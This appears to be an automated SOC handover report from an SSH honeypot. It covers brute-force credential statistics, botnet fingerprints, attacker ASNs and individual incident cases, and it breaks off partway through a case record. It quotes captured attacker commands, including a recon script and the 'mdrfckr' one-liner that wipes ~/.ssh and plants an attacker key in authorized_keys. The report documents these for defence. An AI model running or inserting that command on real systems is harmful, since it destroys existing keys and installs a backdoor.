# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-24 |
| **Generated At** | 2026-07-24T19:35:48Z |
| **Shift Time** | 19:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **232** |
| Confirmed Threats | **209** |
| False Positives Filtered | **23** (9.9%) |
| Unique Attacker IPs | **79** |
| Countries of Origin | **25** |
| High Severity Cases | **181** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **51** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **204** |
| Unique Credential Pairs | **153** |
| Unique Usernames | **20** |
| Unique Passwords | **81** |
| Successful Auth Pairs | **193** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `user` | 22 |
| `test` | 20 |
| `ubuntu` | 18 |
| `pi` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123123` | 8 |
| `123` | 8 |
| `1234` | 8 |
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `centos` | `centos2012` | 6 |
| `root` | `3245gs5662d34` | 5 |
| `support` | `support` | 4 |
| `user` | `0000000` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `postgres` | `123123` | `193.32.162.42` | 2026-07-24T16:56:08 |
| `postgres` | `123` | `193.32.162.42` | 2026-07-24T16:57:36 |
| `postgres` | `pgadmin` | `193.32.162.42` | 2026-07-24T16:58:58 |
| `postgres` | `backup` | `193.32.162.42` | 2026-07-24T17:00:24 |
| `postgres` | `data` | `193.32.162.42` | 2026-07-24T17:01:42 |
| `debian` | `777` | `182.53.52.68` | 2026-07-24T17:02:15 |
| `centos` | `centos2012` | `65.20.149.239` | 2026-07-24T17:02:43 |
| `centos` | `centos2012` | `179.189.85.66` | 2026-07-24T17:02:52 |
| `postgres` | `dbadmin` | `193.32.162.42` | 2026-07-24T17:03:04 |
| `user` | `123456` | `193.32.162.42` | 2026-07-24T17:04:22 |
| `debian` | `777` | `96.56.228.149` | 2026-07-24T17:05:26 |
| `user` | `password` | `193.32.162.42` | 2026-07-24T17:05:40 |
| `centos` | `centos2012` | `114.98.63.18` | 2026-07-24T17:06:01 |
| `centos` | `centos2012` | `221.120.57.125` | 2026-07-24T17:06:10 |
| `centos` | `centos2012` | `10.0.0.73` | 2026-07-24T17:06:19 |
| `user` | `user` | `193.32.162.42` | 2026-07-24T17:06:58 |
| `user` | `12345` | `193.32.162.42` | 2026-07-24T17:08:15 |
| `support` | `support` | `176.53.159.196` | 2026-07-24T17:08:52 |
| `user` | `123456789` | `193.32.162.42` | 2026-07-24T17:09:33 |
| `support` | `support` | `10.0.0.73` | 2026-07-24T17:10:10 |
| `user` | `passw0rd` | `193.32.162.42` | 2026-07-24T17:10:51 |
| `user` | `12345678` | `193.32.162.42` | 2026-07-24T17:12:10 |
| `user` | `1234` | `193.32.162.42` | 2026-07-24T17:13:29 |
| `test` | `8888` | `39.164.94.190` | 2026-07-24T17:13:38 |
| `user` | `qwerty` | `193.32.162.42` | 2026-07-24T17:14:47 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `47.84.108.75` | 2026-07-24T17:15:31 |
| `user` | `letmein` | `193.32.162.42` | 2026-07-24T17:16:03 |
| `test` | `8888` | `220.178.246.43` | 2026-07-24T17:17:08 |
| `user` | `123123` | `193.32.162.42` | 2026-07-24T17:17:23 |
| `user` | `123` | `193.32.162.42` | 2026-07-24T17:18:40 |
| `user` | `welcome` | `193.32.162.42` | 2026-07-24T17:19:55 |
| `user` | `user123` | `193.32.162.42` | 2026-07-24T17:21:14 |
| `user` | `default` | `193.32.162.42` | 2026-07-24T17:22:32 |
| `jkkim` | `1234` | `189.50.142.78` | 2026-07-24T17:23:16 |
| `345gs5662d34` | `345gs5662d34` | `189.50.142.78` | 2026-07-24T17:23:20 |
| `jkkim` | `3245gs5662d34` | `189.50.142.78` | 2026-07-24T17:23:22 |
| `user` | `account` | `193.32.162.42` | 2026-07-24T17:23:48 |
| `user` | `member` | `193.32.162.42` | 2026-07-24T17:25:07 |
| `user` | `client` | `193.32.162.42` | 2026-07-24T17:26:24 |
| `user` | `0000000` | `218.13.214.18` | 2026-07-24T17:26:36 |
| `user` | `0000000` | `200.106.49.149` | 2026-07-24T17:26:44 |
| `test` | `123456` | `193.32.162.42` | 2026-07-24T17:27:40 |
| `test` | `password` | `193.32.162.42` | 2026-07-24T17:28:58 |
| `nobody` | `nobody2002` | `10.0.0.73` | 2026-07-24T17:29:25 |
| `user` | `0000000` | `82.65.140.218` | 2026-07-24T17:29:58 |
| `test` | `test` | `193.32.162.42` | 2026-07-24T17:30:15 |
| `user` | `0000000` | `10.0.0.73` | 2026-07-24T17:30:28 |
| `test` | `12345` | `193.32.162.42` | 2026-07-24T17:31:33 |
| `test` | `123456789` | `193.32.162.42` | 2026-07-24T17:32:51 |
| `test` | `passw0rd` | `193.32.162.42` | 2026-07-24T17:34:07 |
| `test` | `12345678` | `193.32.162.42` | 2026-07-24T17:35:24 |
| `root` | `je1BYYM6sW` | `10.0.0.73` | 2026-07-24T17:36:31 |
| `test` | `1234` | `193.32.162.42` | 2026-07-24T17:36:45 |
| `support` | `7` | `177.174.0.3` | 2026-07-24T17:37:32 |
| `support` | `7` | `62.182.132.94` | 2026-07-24T17:37:39 |
| `test` | `qwerty` | `193.32.162.42` | 2026-07-24T17:38:03 |
| `postgres` | `qwerty1` | `81.214.75.248` | 2026-07-24T17:38:10 |
| `postgres` | `qwerty1` | `71.229.1.186` | 2026-07-24T17:38:16 |
| `test` | `letmein` | `193.32.162.42` | 2026-07-24T17:39:21 |
| `test` | `123123` | `193.32.162.42` | 2026-07-24T17:40:37 |
| `support` | `7` | `65.20.161.126` | 2026-07-24T17:40:52 |
| `support` | `7` | `45.178.227.0` | 2026-07-24T17:40:59 |
| `postgres` | `qwerty1` | `174.126.222.110` | 2026-07-24T17:41:36 |
| `test` | `123` | `193.32.162.42` | 2026-07-24T17:41:57 |
| `test` | `testing` | `193.32.162.42` | 2026-07-24T17:43:14 |
| `test` | `test123` | `193.32.162.42` | 2026-07-24T17:44:32 |
| `root` | `hahaha` | `35.237.94.18` | 2026-07-24T17:45:40 |
| `345gs5662d34` | `345gs5662d34` | `35.237.94.18` | 2026-07-24T17:45:41 |
| `root` | `3245gs5662d34` | `35.237.94.18` | 2026-07-24T17:45:42 |
| `test` | `demo` | `193.32.162.42` | 2026-07-24T17:45:50 |
| `test` | `access` | `193.32.162.42` | 2026-07-24T17:47:07 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-24T17:47:46 |
| `test` | `temp` | `193.32.162.42` | 2026-07-24T17:48:25 |
| `default` | `Password` | `220.178.39.106` | 2026-07-24T17:48:48 |
| `default` | `Password` | `14.153.235.75` | 2026-07-24T17:48:57 |
| `caldera` | `caldera` | `2.26.51.95` | 2026-07-24T17:49:23 |
| `345gs5662d34` | `345gs5662d34` | `2.26.51.95` | 2026-07-24T17:49:26 |
| `caldera` | `3245gs5662d34` | `2.26.51.95` | 2026-07-24T17:49:27 |
| `test` | `trial` | `193.32.162.42` | 2026-07-24T17:49:41 |
| `ubuntu` | `ubuntu` | `193.32.162.42` | 2026-07-24T17:50:58 |
| `nobody` | `99` | `60.18.139.82` | 2026-07-24T17:51:13 |
| `default` | `Password` | `10.0.0.73` | 2026-07-24T17:52:04 |
| `ubuntu` | `password` | `193.32.162.42` | 2026-07-24T17:52:14 |
| `ubuntu` | `123456` | `193.32.162.42` | 2026-07-24T17:53:30 |
| `nobody` | `99` | `112.26.99.93` | 2026-07-24T17:54:22 |
| `nobody` | `99` | `211.114.81.212` | 2026-07-24T17:54:34 |
| `nobody` | `99` | `10.0.0.73` | 2026-07-24T17:54:43 |
| `ubuntu` | `12345` | `193.32.162.42` | 2026-07-24T17:54:45 |
| `ubuntu` | `123456789` | `193.32.162.42` | 2026-07-24T17:56:00 |
| `ubuntu` | `passw0rd` | `193.32.162.42` | 2026-07-24T17:57:17 |
| `ubuntu` | `12345678` | `193.32.162.42` | 2026-07-24T17:58:34 |
| `ubuntu` | `1234` | `193.32.162.42` | 2026-07-24T17:59:51 |
| `ubuntu` | `qwerty` | `193.32.162.42` | 2026-07-24T18:01:09 |
| `ubuntu` | `letmein` | `193.32.162.42` | 2026-07-24T18:02:25 |
| `guest` | `666` | `170.233.29.157` | 2026-07-24T18:02:37 |
| `guest` | `666` | `153.37.177.219` | 2026-07-24T18:02:45 |
| `ubuntu` | `123123` | `193.32.162.42` | 2026-07-24T18:03:42 |
| `ubuntu` | `123` | `193.32.162.42` | 2026-07-24T18:04:58 |
| `guest` | `555555` | `218.149.228.135` | 2026-07-24T18:05:16 |
| `guest` | `555555` | `179.185.227.77` | 2026-07-24T18:05:28 |
| `guest` | `555555` | `10.0.0.73` | 2026-07-24T18:05:39 |
| `guest` | `666` | `10.0.0.73` | 2026-07-24T18:06:09 |
| `ubuntu` | `server` | `193.32.162.42` | 2026-07-24T18:06:14 |
| `ubuntu` | `default` | `193.32.162.42` | 2026-07-24T18:07:29 |
| `ubuntu` | `admin` | `193.32.162.42` | 2026-07-24T18:08:47 |
| `root` | `000000` | `92.118.39.71` | 2026-07-24T18:09:47 |
| `ubuntu` | `ubuntu123` | `193.32.162.42` | 2026-07-24T18:10:03 |
| `ubuntu` | `cloud` | `193.32.162.42` | 2026-07-24T18:11:20 |
| `default` | `default2008` | `119.247.187.188` | 2026-07-24T18:11:29 |
| `root` | `111111` | `92.118.39.71` | 2026-07-24T18:11:39 |
| `default` | `default2008` | `211.178.165.251` | 2026-07-24T18:11:42 |
| `ubuntu` | `login` | `193.32.162.42` | 2026-07-24T18:12:36 |
| `root` | `123` | `92.118.39.71` | 2026-07-24T18:13:30 |
| `pi` | `raspberry` | `193.32.162.42` | 2026-07-24T18:13:51 |
| `pi` | `password` | `193.32.162.42` | 2026-07-24T18:15:07 |
| `root` | `123123` | `92.118.39.71` | 2026-07-24T18:15:19 |
| `pi` | `123456` | `193.32.162.42` | 2026-07-24T18:16:23 |
| `root` | `1234` | `92.118.39.71` | 2026-07-24T18:17:04 |
| `pi` | `12345` | `193.32.162.42` | 2026-07-24T18:17:41 |
| `root` | `12345` | `92.118.39.71` | 2026-07-24T18:18:48 |
| `pi` | `123456789` | `193.32.162.42` | 2026-07-24T18:18:56 |
| `pi` | `passw0rd` | `193.32.162.42` | 2026-07-24T18:20:11 |
| `pi` | `12345678` | `193.32.162.42` | 2026-07-24T18:21:26 |
| `root` | `12345678` | `92.118.39.71` | 2026-07-24T18:22:04 |
| `pi` | `1234` | `193.32.162.42` | 2026-07-24T18:22:37 |
| `root` | `123456789` | `92.118.39.71` | 2026-07-24T18:23:41 |
| `pi` | `qwerty` | `193.32.162.42` | 2026-07-24T18:23:49 |
| `pi` | `letmein` | `193.32.162.42` | 2026-07-24T18:25:01 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-07-24T18:25:21 |
| `pi` | `123123` | `193.32.162.42` | 2026-07-24T18:26:14 |
| `centos` | `1qaz2wsx` | `65.20.202.4` | 2026-07-24T18:26:28 |
| `root` | `654321` | `92.118.39.71` | 2026-07-24T18:26:58 |
| `pi` | `123` | `193.32.162.42` | 2026-07-24T18:27:31 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-07-24T18:28:41 |
| `pi` | `raspberrypi` | `193.32.162.42` | 2026-07-24T18:28:48 |
| `pi` | `pihole` | `193.32.162.42` | 2026-07-24T18:30:07 |
| `centos` | `1qaz2wsx` | `10.0.0.73` | 2026-07-24T18:30:09 |
| `root` | `admin` | `92.118.39.71` | 2026-07-24T18:30:24 |
| `pi` | `admin` | `193.32.162.42` | 2026-07-24T18:31:28 |
| `root` | `admin123` | `92.118.39.71` | 2026-07-24T18:32:11 |
| `pi` | `default` | `193.32.162.42` | 2026-07-24T18:32:51 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-07-24T18:33:58 |
| `pi` | `retropie` | `193.32.162.42` | 2026-07-24T18:34:16 |
| `pi` | `berry` | `193.32.162.42` | 2026-07-24T18:35:37 |
| `root` | `password` | `92.118.39.71` | 2026-07-24T18:35:46 |
| `nginx` | `nginx` | `193.32.162.42` | 2026-07-24T18:36:49 |
| `root` | `password1` | `92.118.39.71` | 2026-07-24T18:37:28 |
| `blank` | `blank2006` | `220.178.246.43` | 2026-07-24T18:37:33 |
| `blank` | `blank2006` | `223.99.212.58` | 2026-07-24T18:37:41 |
| `nginx` | `password` | `193.32.162.42` | 2026-07-24T18:38:00 |
| `blank` | `blank2006` | `10.0.0.73` | 2026-07-24T18:38:03 |
| `nginx` | `123456` | `193.32.162.42` | 2026-07-24T18:39:12 |
| `root` | `qwerty` | `92.118.39.71` | 2026-07-24T18:39:12 |
| `admin` | `admin000` | `36.64.36.101` | 2026-07-24T18:39:42 |
| `admin` | `admin000` | `196.216.81.126` | 2026-07-24T18:39:51 |
| `nginx` | `12345` | `193.32.162.42` | 2026-07-24T18:40:27 |
| `root` | `root123` | `92.118.39.71` | 2026-07-24T18:40:56 |
| `nginx` | `123456789` | `193.32.162.42` | 2026-07-24T18:41:42 |
| `root` | `toor` | `92.118.39.71` | 2026-07-24T18:42:41 |
| `nginx` | `passw0rd` | `193.32.162.42` | 2026-07-24T18:42:58 |
| `nginx` | `12345678` | `193.32.162.42` | 2026-07-24T18:44:13 |
| `admin` | `000000` | `92.118.39.71` | 2026-07-24T18:44:24 |
| `nginx` | `1234` | `193.32.162.42` | 2026-07-24T18:45:30 |
| `admin` | `111111` | `92.118.39.71` | 2026-07-24T18:46:21 |
| `nginx` | `qwerty` | `193.32.162.42` | 2026-07-24T18:46:50 |
| `root` | `admin123456.` | `207.56.225.202` | 2026-07-24T18:47:56 |
| `345gs5662d34` | `345gs5662d34` | `207.56.225.202` | 2026-07-24T18:47:59 |
| `root` | `3245gs5662d34` | `207.56.225.202` | 2026-07-24T18:48:00 |
| `nginx` | `letmein` | `193.32.162.42` | 2026-07-24T18:48:12 |
| `admin` | `123` | `92.118.39.71` | 2026-07-24T18:48:13 |
| `nginx` | `123123` | `193.32.162.42` | 2026-07-24T18:49:33 |
| `dmdba` | `dmdba2025` | `201.217.12.57` | 2026-07-24T18:50:05 |
| `admin` | `123123` | `92.118.39.71` | 2026-07-24T18:50:06 |
| `345gs5662d34` | `345gs5662d34` | `201.217.12.57` | 2026-07-24T18:50:09 |
| `dmdba` | `3245gs5662d34` | `201.217.12.57` | 2026-07-24T18:50:10 |
| `nginx` | `123` | `193.32.162.42` | 2026-07-24T18:50:54 |
| `nobody` | `6666` | `121.189.198.60` | 2026-07-24T18:51:03 |
| `nobody` | `6666` | `61.37.150.6` | 2026-07-24T18:51:12 |
| `root` | `123456ab@` | `124.226.216.189` | 2026-07-24T18:51:34 |
| `345gs5662d34` | `345gs5662d34` | `124.226.216.189` | 2026-07-24T18:51:52 |
| `root` | `3245gs5662d34` | `124.226.216.189` | 2026-07-24T18:51:53 |
| `root` | `Ma123456` | `147.50.103.212` | 2026-07-24T18:51:57 |
| `admin` | `1234` | `92.118.39.71` | 2026-07-24T18:51:58 |
| `345gs5662d34` | `345gs5662d34` | `147.50.103.212` | 2026-07-24T18:52:02 |
| `root` | `3245gs5662d34` | `147.50.103.212` | 2026-07-24T18:52:04 |
| `root` | `1234567m` | `116.109.216.74` | 2026-07-24T18:52:10 |
| `345gs5662d34` | `345gs5662d34` | `116.109.216.74` | 2026-07-24T18:52:14 |
| `root` | `3245gs5662d34` | `116.109.216.74` | 2026-07-24T18:52:16 |
| `nginx` | `admin` | `193.32.162.42` | 2026-07-24T18:52:19 |
| `nginx` | `web` | `193.32.162.42` | 2026-07-24T18:53:38 |
| `admin` | `12345` | `92.118.39.71` | 2026-07-24T18:53:41 |
| `postgres` | `0987654321` | `10.0.0.73` | 2026-07-24T18:54:27 |
| `nginx` | `server` | `193.32.162.42` | 2026-07-24T18:54:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **232** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 123 |
| OpenSSH | 36 |
| libssh | 30 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 119 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 36 | 35 |
| `f555226df196...` | Mirai/variant | 22 | 8 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 119 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 36 | 35 | Mirai/variant |
| `f555226df196...` | libssh | 22 | 8 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 118 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.42`, `92.118.39.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `2.26.51.95`, `201.217.12.57`, `147.50.103.212`, `124.226.216.189`, `189.50.142.78`, `35.237.94.18`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **79** |
| Unique ASNs | **54** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS46562` | Performive LLC | 4 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (178)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0108c67461ef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:56 |
| **Last Seen** | 2026-07-24 16:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:56:06` | `cowrie.session.connect` |
| `2026-07-24 16:56:07` | `cowrie.client.version` |
| `2026-07-24 16:56:07` | `cowrie.client.kex` |
| `2026-07-24 16:56:08` | `cowrie.login.success` |
| `2026-07-24 16:56:09` | `cowrie.session.params` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.success` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:09` | `cowrie.command.input` |
| `2026-07-24 16:56:10` | `cowrie.log.closed` |
| `2026-07-24 16:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5dacaa0a757

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:57 |
| **Last Seen** | 2026-07-24 16:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:57:33` | `cowrie.session.connect` |
| `2026-07-24 16:57:33` | `cowrie.client.version` |
| `2026-07-24 16:57:33` | `cowrie.client.kex` |
| `2026-07-24 16:57:36` | `cowrie.login.success` |
| `2026-07-24 16:57:37` | `cowrie.session.params` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.success` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:37` | `cowrie.command.input` |
| `2026-07-24 16:57:38` | `cowrie.log.closed` |
| `2026-07-24 16:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b722059a13d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:58 |
| **Last Seen** | 2026-07-24 16:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:58:57` | `cowrie.session.connect` |
| `2026-07-24 16:58:57` | `cowrie.client.version` |
| `2026-07-24 16:58:57` | `cowrie.client.kex` |
| `2026-07-24 16:58:58` | `cowrie.login.success` |
| `2026-07-24 16:59:00` | `cowrie.session.params` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.success` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.command.input` |
| `2026-07-24 16:59:00` | `cowrie.log.closed` |
| `2026-07-24 16:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d54ae865960

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:00 |
| **Last Seen** | 2026-07-24 17:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
